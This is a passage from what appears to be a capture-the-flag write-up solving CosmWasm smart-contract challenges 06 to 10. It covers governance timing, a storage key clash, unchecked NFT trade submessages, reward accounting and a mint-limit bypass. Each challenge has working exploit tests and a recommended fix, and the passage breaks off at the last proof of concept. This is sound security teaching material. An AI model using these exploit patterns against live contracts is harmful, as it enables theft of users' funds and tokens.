        .timestamp
        .plus_seconds(config.voting_window)
        < env.block.time
    {
        return Err(ContractError::ProposalNotReady {});
    }
```

The implementation checks if the current block time is within the voting window,
and errors otherwise. This means that:

1. Any proposal can be forced to resolve immediately, stopping others from ever collecting the necessary votes. Effectively, this makes the governance susceptible to DoS attacks.
2. Any proposal for which more than `config.voting_window` time has elapsed, errors on resolution, even if it achieved the required amout of support. Effectively, no proposal can pass, when it would be expected to.

### Proof of concept

Insert the following code at the end of [`integration_tests.rs`](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-06/src/integration_tests.rs#L238).

1. `exploit_flow2` demonstrates that `USER2` is able to resolve a proposal just after `USER1` opens it,
without the voting window having passed.
2. `exploit_flow3` demonstrates that it is impossible to resolve a successful but expired vote after more than `VOTING_WINDOW` time has passed.
3. `exploit_flow4` demonstrates that it is possible for a malicious user to observe a proposal that is about to pass (e.g., by observing `ADMIN`'s vote transaction in the mempool), and then quickly resolve the proposal, and put themselves instead of the original proposer, thus being elected as the owner.

```rust
    #[test]
    fn exploit_flow2() {
        let (mut app, contract_addr, _) = proper_instantiate();

        // User1 propose themselves
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // User2 is able to immediately resolve proposal, the voting window has not passed
        let result = app
            .execute_contract(
                Addr::unchecked(USER2),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        assert_eq!(result.events[1].attributes[2], attr("result", "Failed"));
    }

    #[test]
    fn exploit_flow3() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // User1 propose themselves
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // Admin votes, simulates msg from CW20 contract
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr,
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(60_001),
            },
            &[],
        )
        .unwrap();

        // fast forward 2 x 24 hrs!
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW + 1);
        });

        // cannot resolve proposal with sufficient votes
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::ResolveProposal {},
            &[],
        )
        .unwrap_err();
    }

    #[test]
    fn exploit_flow4() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // User1 propose themselves
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // User2 observes the Admin's voting transaction, and first ends proposal
        app
            .execute_contract(
                Addr::unchecked(USER2),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        // Then User2 immediately proposes themselves
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // Admin votes, simulates msg from CW20 contract
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr,
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(60_001),
            },
            &[],
        )
        .unwrap();

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });

        // User1 ends proposal
        app
            .execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        // Check that ownership has been transferred to USER2
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, USER2.to_string());
    }        
```

### Recommendation

The check above should be inverted, to allow resolving a vote only after the
voting window has passed.

Place the following code in [`contract.rs` L113-L119](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-06/src/contract.rs#L113-L119):

```rust
    if current_proposal
        .timestamp
        .plus_seconds(config.voting_window)
        >= env.block.time
    {
        return Err(ContractError::ProposalNotReady {});
    }
```

Overall, we should note that a voting system based on sending CW-20, without designating the recipient of the vote opens a wide area of possible attacks on such voting system. We recommend to replace this with a specialized `Vote` message, which would include the casted vote (recepient) as well as the vote tokens as message fields, and would interact with the CW-20 contract to receive the casted tokens.

---


## Challenge 07: *Tyrfing*

### Description

The contract is using the same storage key `"address"` for the `TOP_DEPOSITOR`
and `OWNER` state constants. Hence, as soon as an unprivileged user becomes the top depositor,
they can execute arbitrary cosmos messages on behalf of the contract via
`ExecuteMsg::OwnerAction`. In particular, they can send tokens to themselves by
executing `BankMsg::Send`, and thus drain the contract account.

Specifically, the issue is in these two lines:

 - [state.rs:4](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-07/src/state.rs#L4)

```rust
pub const OWNER: Item<Addr> = Item::new("address");
```

 - [contract.rs:14](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-07/src/contract.rs#L14)

```rust
pub const TOP_DEPOSITOR: Item<Addr> = Item::new("address");
```

That is, the value of `TOP_DEPOSITOR` is stored in the same location as the value of `OWNER`.
  
### Proof of concept

The test below demonstrates how unprivileged `USER1` can exploit this.
Note that we had to fix `base_scenario`, in order to satisfy the conditions
in [README.md](https://github.com/oak-security/cosmwasm-ctf/blob/main/ctf-07/README.md).

```rust
    // base_scenario does not set up the state as per README.md.
    // We have to fix this.
    pub fn base_scenario_fixed() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {
            owner: ADMIN.to_string(),
            threshold: Uint128::from(99u128),
        };

        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        // User 1 deposit
        app = mint_tokens(app, USER1.to_string(), Uint128::from(10_000u128));
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // User 2 deposit
        app = mint_tokens(app, USER2.to_string(), Uint128::from(10_000u128));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        (app, contract_addr)
    }

    #[test]
    fn exploit_flow() {
        let (mut app, contract_addr) = base_scenario_fixed();

        let bal1 = app.wrap().query_balance(USER1, DENOM).unwrap();
        assert_eq!(bal1.amount, Uint128::new(0));

        let bal2 = app.wrap().query_balance(USER2, DENOM).unwrap();
        assert_eq!(bal2.amount, Uint128::new(0));

        // Query top depositor
        let top: ConfigQueryResponse = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        // the top depositor (USER1) is now the owner!
        assert_eq!(top.owner, Addr::unchecked(USER1));

        // User 1 can now execute an arbitrary cosmos msg as owner.
        // In particular, they can send all tokens from the
        // contract address to themselves.
        let msg: CosmosMsg = CosmosMsg::Bank(BankMsg::Send {
            to_address: USER1.to_string(),
            amount: vec![coin(20_000, DENOM)],
        });

        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction { msg: msg },
            &[],
        )
        .unwrap();

        // User 1 now has 20_000 tokens
        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(20_000));

        // The contract has 0 tokens
        let contract_balance = app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap();
        assert_eq!(contract_balance.amount, Uint128::new(0));
    }
```

### Recommendation

It is easy to fix the issue by introducing **different** keys for `OWNER` and `TOP_DEPOSITOR`.
For example:

 - [state.rs:4](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-07/src/state.rs#L4)

```rust
pub const OWNER: Item<Addr> = Item::new("owner");
```

 - [contract.rs:14](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-07/src/contract.rs#L14)

```rust
pub const TOP_DEPOSITOR: Item<Addr> = Item::new("top_depositor");
```

We also recommend to move all state-related declarations into
[`state.rs`](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-07/src/state.rs), to make similar name clashes harder to miss.

---

## Challenge 08: *Gjallarhorn*

**Due to incorrect treatment of submessages, a user can retrieve other users' NFTs for free**

### Description

The contract represents the marketplace for NFTs, where users can both sell their NFTs for coins, as well as allow other users to offer to trade other NFTs in exchange. The latter functionality is implemented in several steps:

- USER1 proposes the NFT1 for sale
- USER2 creates a trade offer, offering NFT2 (owned by USER2) in exchange for NFT1
- USER1 accepts the trade offer. Upon the accept, NFT1 is transferred to USER2, and NFT2 is transferred to USER1.

The contract's vulnerability lies in how the last step is implemented in the function [exec_accept_trade()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-08/src/contract.rs#L240-L292), namely via CosmWasm submessages:


```rust
// Asked
let mut submsgs = vec![SubMsg::reply_always(
    WasmMsg::Execute {
        contract_addr: config.nft_contract.to_string(),
        msg: to_binary(&Cw721ExecuteMsg::TransferNft {
            recipient: trade.trader.to_string(),
            token_id: trade.asked_id.clone(),
        })?,
        funds: vec![],
    },
    TRADE_REPLY,
)];


// Offered
submsgs.push(SubMsg::reply_always(
    WasmMsg::Execute {
        contract_addr: config.nft_contract.to_string(),
        msg: to_binary(&Cw721ExecuteMsg::TransferNft {
            recipient: sale.owner.to_string(),
            token_id: trade.to_trade_id.clone(),
        })?,
        funds: vec![],
    },
    TRADE_REPLY,
));
```

These two submessages are addressed to the token contract, implementing [CW-721 NFTs](https://github.com/CosmWasm/cw-nfts/blob/main/packages/cw721/README.md). The semantics of executing submessages is tricky though, as outlined in the [CosmWasm Submessages documentation](https://github.com/CosmWasm/cosmwasm/blob/main/SEMANTICS.md#submessages): in particular, if a submessage is submitted with `reply_always` and the contract has the `reply` endpoint (which is the the case for the contract in question), and the submessage fails, then the contract has to carefully process the submessage reply, and return an error in case the whole transaction should be reverted. If a success is returned, then the transaction as a whole will persist, with all state changes, despite the submessage failure. Exactly this
happens in the [contract's reply() endpoint](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-08/src/contract.rs#L325-L343), which returns success irrespectively of whether the submessage succeeded or failed:

```rust
#[cfg_attr(not(feature = "library"), entry_point)]
pub fn reply(deps: DepsMut, _env: Env, reply: Reply) -> Result<Response, ContractError> {
    let mut ops = OPERATIONS.load(deps.storage).unwrap_or_default();
    match reply.id {
        SALE_REPLY => {
            ops.n_sales += Uint128::one();
            OPERATIONS.save(deps.storage, &ops)?;


            Ok(Response::new().add_attribute("Operation", "sale"))
        }
        TRADE_REPLY => {
            ops.n_trades += Uint128::one();
            OPERATIONS.save(deps.storage, &ops)?;


            Ok(Response::new().add_attribute("Operation", "trade"))
        }
        _ => Err(ContractError::UnrecognizedReply {}),
    }
}
```

This behavior constitutes an exploitable vulnerability: in the scenario above, USER2 may revoke the contract's approval to trade NFT2 via the CW-721 contract, and the transfer of NFT2 to USER1 will fail.

### Proof of concept

In the PoC below (paste after [integration_tests:450](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-08/src/integration_tests.rs#L450)), steps 1-4 and 6 represent the normal flow of trading NFT1 for NFT2, while step 5 represents the adversarial action of USER2:

1. `USER1` grants permission to the contract to transfer `NFT1`
2. `USER1` puts `NFT1` on sale
3. `USER2` grants permission to the contract to transfer `NFT2`
4. `USER2` proposes to trade `NFT2` in exchange for `NFT1`
5. `USER2` revokes the previously granted permission to transfer `NFT2`
6. `USER1` accepts the trade. The transfer of `NFT1` to `USER2` succeeds, but the transfer of `NFT2` to `USER1` fails. Nevertheless, the transaction succeeds.
7. Verify that `NFT1` was indeed transferred to `USER2`
8. Verify that `USER2` still possesses `NFT2`

```rust
#[test]
fn exploit_flow() {
    let (mut app, contract_addr, token_addr) = proper_instantiate();

    // 1. USER1 approves to transfer the NFT1
    app.execute_contract(
        Addr::unchecked(USER1),
        token_addr.clone(),
        &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
            spender: contract_addr.to_string(),
            token_id: NFT1.to_string(),
            expires: None,
        },
        &[],
    )
    .unwrap();

    // 2. USER1 creates a new sale for NFT1
    app.execute_contract(
        Addr::unchecked(USER1),
        contract_addr.clone(),
        &ExecuteMsg::NewSale {
            id: NFT1.to_string(),
            price: Uint128::from(100u128),
            tradable: true,
        },
        &[],
    )
    .unwrap();

    let sale_info: Sale = app
        .wrap()
        .query_wasm_smart(
            contract_addr.clone(),
            &QueryMsg::GetSale {
                id: NFT1.to_string(),
            },
        )
        .unwrap();
    assert_eq!(sale_info.owner, USER1.to_string());

    // 3. USER2 approves to transfer the NFT2
    app.execute_contract(
        Addr::unchecked(USER2),
        token_addr.clone(),
        &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
            spender: contract_addr.to_string(),
            token_id: NFT2.to_string(),
            expires: None,
        },
        &[],
    )
    .unwrap();

    // 4. USER2 creates the trade offer, proposing NFT2 for NFT1
    app.execute_contract(
        Addr::unchecked(USER2),
        contract_addr.clone(),
        &ExecuteMsg::NewTrade {
            target: NFT1.to_string(),
            offered: NFT2.to_string(),
        },
        &[],
    )
    .unwrap();

    let owner_of: Trade = app
        .wrap()
        .query_wasm_smart(
            contract_addr.clone(),
            &QueryMsg::GetTrade {
                id: NFT1.to_string(),
                trader: USER2.to_string(),
            },
        )
        .unwrap();
    assert_eq!(owner_of.trader, USER2.to_string());

    // 5. USER2 revokes the approval for the NFT2
    app.execute_contract(
        Addr::unchecked(USER2),
        token_addr.clone(),
        &cw721_base::msg::ExecuteMsg::Revoke::<Empty, Empty> { 
            spender: contract_addr.to_string(),
            token_id: NFT2.to_string(),
        },
        &[],
    )
    .unwrap();


    // 6. USER1 accepts the trade of NFT1 in exchange for NFT2
    app.execute_contract(
        Addr::unchecked(USER1),
        contract_addr,
        &ExecuteMsg::AcceptTrade {
            id: NFT1.to_string(),
            trader: USER2.to_string(),
        },
        &[],
    )
    .unwrap();

    // 7. NFT1 is transferred to USER2
    let owner_of: OwnerOfResponse = app
        .wrap()
        .query_wasm_smart(
            token_addr.clone(),
            &Cw721QueryMsg::OwnerOf {
                token_id: NFT1.to_string(),
                include_expired: None,
            },
        )
        .unwrap();
    assert_eq!(owner_of.owner, USER2.to_string());

    // 8. USER2 still possesses NFT2 as well
    let owner_of: OwnerOfResponse = app
        .wrap()
        .query_wasm_smart(
            token_addr,
            &Cw721QueryMsg::OwnerOf {
                token_id: NFT2.to_string(),
                include_expired: None,
            },
        )
        .unwrap();
    assert_eq!(owner_of.owner, USER2.to_string());
}
```

### Recommendation

One possible way to fix the vulnerability is to properly process submessage replies in the [contract's reply() endpoint](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-08/src/contract.rs#L325-L343), i.e., to return an error on submessage failure.

A preferred solution though, is to get rid of submessages altogether, and employ "normal" CosmWasm messages instead. Submessages are required only when a specific bit of information needs to be extracted from the message execution, such as the address of a newly deployed contract. This is not the case for the present contract: the messages to the CW-721 contract only need to succeed, and for that scenario, standard CosmWasm messages are sufficient. Thus, we recommend the following:

- Move the logic of the [reply() endpoint](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-08/src/contract.rs#L325-L343), namely that of keeping track of the number of executed sales and trades to the respective endpoints: [exec_buy()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-08/src/contract.rs#L105) and [exec_accept_trade()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-08/src/contract.rs#L241); remove the [reply() endpoint](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-08/src/contract.rs#L325-L343).
- In functions [exec_buy()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-08/src/contract.rs#L105) and [exec_accept_trade()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-08/src/contract.rs#L241), instead of attaching submessages, attach the same messages to the response as standard messages (without the `SubMsg` envelope, and using the `add_message()` function).

The changes proposed above should result in a contract with the same desired functionality, but with simpler architecture, less dependencies, and less attack surface.

---


## Challenge 09: *Brisingamen*

### Description

<a href="primary"></a>
#### Primary finding: Unfair distribution of rewards

The code of the contract contains a corner-case that lets one user withdraw
all of their funds and deposit them later without losing their staking rewards.
In this case, a user who was staking all the time receives the same rewards as a
user who was unstaking and staking all of their funds.

The issue is caused by [this
optimization](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-09/src/contract.rs#L179-L182)
in `update_rewards`:

```rust
    // no need update amount if zero
    if user.staked_amount.is_zero() {
        return;
    }
```

Below is a concrete scenario that demonstrates the issue:

 - the base scenario: `USER` deposits 10_000 tokens, the owner increases the reward by 10_000.
 - `USER1` deposits 10_000 tokens.
 - `USER2` deposits 10_000 tokens.
 - the owner increases the rewards by 1000.
 - `USER1` withdraws all of their 10_000 tokens.
 - the owner increases the rewards twice by 1000.
 - `USER1` deposits 10_000 tokens.
 - both `USER1` and `USER2` have 1333 in rewards.

It is clear that `USER2` would consider this staking behavior unfair.

Note that this only happens when `USER1` withdraws their entire deposited amount,
thus making their `staked_amount` equal to zero. If `USER1`
withdraws 9999 tokens instead of 10_000 and then deposits 9999 tokens back (as in
the above scenario), the rewards accrue in a fair manner.

<a href="secondary"></a>
#### Secondary finding: Small rounding errors in rewards

The contract is susceptible to paying slightly "unfair" staking rewards, due to unintended
rounding errors when multiplying a [`cosmwasm_std::Decimal`](https://docs.rs/cosmwasm-std/latest/cosmwasm_std/struct.Decimal.html)
with a [`cosmwasm_std::Uint128`](https://docs.rs/cosmwasm-std/latest/cosmwasm_std/struct.Uint128.html).

**Assumptions**. The task does not clearly specify what it means to have fair rewards.
We assume that fairness means the following. Assume that `USER1` and `USER2` deposit `stake1`
and `stake2` in the same round for the first time. Then, the following should hold true:

```
rewards1 * stake2 == rewards2 * stake1
```

That is, the rewards are proportional to the staked amounts by `USER1` and
`USER2`. For instance, if `USER1` deposit 10x more than `USER2`, they expect to
get 10x more rewards.

While this is roughly true in the contract, there are small deviations in the rewards,
as we demonstrate below.

**Analysis.** `Decimal` stores a fixed-point decimal value with 18 fractional digits inside a
`Uint128`, by treating the 18 lowest decimal digits of the `Uint128` as fractional
digits. For example, `3.14159` is stored as the `Uint128` `3_141_590_000_000_000_000`.

The contract updates a user's rewards in storage each time the user executes an
`Deposit`, `Withdraw`, or `ClaimRewards` message. The respective logic is found
in the contract's
[`update_rewards` function](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-09/src/contract.rs#L178-L189):

```rust
pub fn update_rewards(user: &mut UserRewardInfo, state: &State) {
  ...
  let reward = (state.global_index - user.user_index) * user.staked_amount;
  user.pending_rewards += reward;

  user.user_index = state.global_index;
}
```

In the code sample above, `state.global_index` and `user.user_index` are `Decimal`s,
while `user.staked_amount` is a `Uint128`:

* `state.global_index` is the global ratio of total reward tokens to total staked tokens,
* `user.user_index` is the `state.global_index` at the user's last `update_rewards`, and
* `user.staked_amount` is the amount of tokens staked by the user.

Multiplication between the `Decimal` left-hand side and the `Uint128` right-hand side
[is implemented](https://github.com/CosmWasm/cosmwasm/blob/aca2de10d2332609a822bd1a8d5e37159fd6abc8/packages/std/src/math/decimal.rs#L607-L612)
as a multiplication of the `Uint128` `user.staked_amount` with an intermediate `Decimal` – the difference
`state.global_index - user.user_index` *divided* by `10^18`:

```rust
const DECIMAL_FRACTIONAL: Uint128 = Uint128::new(1_000_000_000_000_000_000u128); // 1*10**18
...
fn mul(self, rhs: Decimal) -> Self::Output {
  ...
  self.multiply_ratio(rhs.0, Decimal::DECIMAL_FRACTIONAL)
}
```

This means that for varying values of `user.staked_amount`, it may
happen that `(state.global_index - user.user_index) * user.staked_amount` is
rounded.

In particular, this happens when `USER1` deposits 10x more tokens than `USER2`,
and the awards pool is smaller than the staked pool.

A concrete example:

 - Both `USER1` and `USER2` make deposits in the same round:
   - `USER1` deposits 7559167 tokens
   - `USER2` deposits 756090 tokens
 - The owner increases the rewards by 5120, moving to the next round
 - Now `USER1` and `USER2` have the following rewards:
   - `USER1` has 4648 reward tokens
   - `USER2` has 464 reward tokens

While the rewards are more or less proportional to the staking, the proportions
vary in the fourth digit for four digit rewards in this case. Here are the
proportions, as computed in python:

```python
>>> 7559167. / 756090
9.997707944821384
>>> 4648. / 464
10.017241379310345
```

### Proof of concept

#### POC for the primary finding: Unfair distribution of rewards

Put the below code fragment into
[integration_tests.rs:413](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-09/src/integration_tests.rs#L413),
and execute the test with `cargo test`.

This test reproduces the scenario described in the [primary
finding](#primary) above .

```rust
    // one more user, in addition to USER and USER2
    pub const USER1: &str = "user1";

    #[test]
    fn exploit_flow_unfair1() {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {};
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(OWNER),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        // mint reward funds to owner
        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(100_000));

        // mint funds to users
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
        app = mint_tokens(app, USER1.to_owned(), Uint128::new(10_000));
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
        
        // base scenario
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
            .unwrap();

        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
            .unwrap();

        // both USER1 and USER2 deposit equal amounts
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
            .unwrap();
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
            .unwrap();

        // owner increases the reward
        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
            .unwrap();

        // USER1 withdraws all of their stake
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Withdraw { amount: Uint128::new(10_000) },
            &[],
        )
            .unwrap();

        // owner increases the reward
        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
            .unwrap();

        // owner increases the reward
        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
            .unwrap();

        // USER1 deposits the same amount again
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
            .unwrap();
 
        // query user1 info
        let user_info1: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER1.to_string(),
                },
            )
            .unwrap();

        // query user2 info
        let user_info2: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER2.to_string(),
                },
            )
            .unwrap();

        // USER1 and USER2 have the same rewards,
        // though USER2 was staking all the time, and USER1 was not
        assert_eq!(user_info1.pending_rewards, user_info2.pending_rewards);

        // can both users claim all of their rewards?
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::ClaimRewards { }, 
            &[],
        )
            .unwrap();
        
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::ClaimRewards { }, 
            &[],
        )
            .unwrap();

        // Yes, they can. Let's check their rewards
         let balance1= app
            .wrap()
            .query_balance(USER1.to_string(), REWARD_DENOM)
            .unwrap()
            .amount;

         let balance2= app
            .wrap()
            .query_balance(USER2.to_string(), REWARD_DENOM)
            .unwrap()
            .amount;

        // Both USER1 and USER2 have claimed the same amount of rewards
        assert_eq!(balance1, balance2);
        // forbiddnstars
   }
```

#### POC for the secondary finding: Rounding errors

Put the below code fragment into
[integration_tests.rs:413](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-09/src/integration_tests.rs#L413),
and execute the test with `cargo test`.

This test reproduces the scenario described in the [secondary
finding](#secondary) above.

```rust
    // one more user, in addition to USER and USER2
    pub const USER1: &str = "user1";

    #[test]
    fn exploit_flow_rounding1() {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {};
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(OWNER),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        // mint reward funds to owner
        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(20_000));

        // mint funds to users
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
        app = mint_tokens(app, USER1.to_owned(), Uint128::new(10_000_000));
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000_000));
        
        // base scenario
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
            .unwrap();

        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
            .unwrap();

        // USER1 and USER2 deposit funds
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(7559167, DENOM)],
        )
            .unwrap();
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(756090, DENOM)],
        )
            .unwrap();

        // owner increases the reward
        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(5120, REWARD_DENOM)],
        )
            .unwrap();

        // query user1 info
        let user_info1: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER1.to_string(),
                },
            )
            .unwrap();

        // query user2 info
        let user_info2: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER2.to_string(),
                },
            )
            .unwrap();

        // USER1 gets slightly disproportionate rewards
        assert_eq!(user_info1.pending_rewards, Uint128::new(4648));
        assert_eq!(user_info2.pending_rewards, Uint128::new(464));
   }
```

### Recommendation

For the primary finding of unfair reward distribution, we recommend to simply
remove the
[optimization](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-09/src/contract.rs#L179-L182)
in `update_rewards`:

```rust
    // no need update amount if zero
    if user.staked_amount.is_zero() {
        return;
    }
```

For precision loss due to rounding, it is hard to give a recommendation that
works in all cases. Since the precision is mainly lost in cases where the
`REWARD_DENOM` has a significantly smaller pool than `DENOM`, we recommend the
owner maintains the reward pool and the `DENOM` pool at similar sizes.

---


## Challenge 10: *Mistilteinn*

**Due to state dependency on external contract, `mint_per_user` restriction can be bypassed**

### Description

The contract allows users to mint NFTs via the single [mint() endpoint](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-10/src/contract.rs#L84-L131), but restricts the total number they should be able to mint using the `mint_per_user` state component. However, instead of keeping the corresponding per-user variables in the contract itself, it relies on querying the token contract that implements CW-721 [as follows](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-10/src/contract.rs#L95-L107):

```rust
let tokens_response: TokensResponse = deps.querier.query_wasm_smart(
    config.nft_contract.to_string(),
    &Cw721QueryMsg::Tokens::<Empty> {
        owner: info.sender.to_string(),
        start_after: None,
        limit: None,
    },
)?;


// ensure mint per user limit is not exceeded
if tokens_response.tokens.len() >= config.mint_per_user as usize {
    return Err(ContractError::MaxLimitExceeded {});
}
```

The problem with the code above is that the number of tokens a user holds in the `nft_contract` may change (decrease), also temporarily, thus allowing users to bypass the `mint_per_user` restriction, as is demonstrated in the PoC below.
  
### Proof of concept

The below PoC (to paste after [integration_tests:142](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-10/src/integration_tests.rs#L142), while adjusting the imports as necessary) demonstrates how a user can bypass the `mint_per_user` restriction:

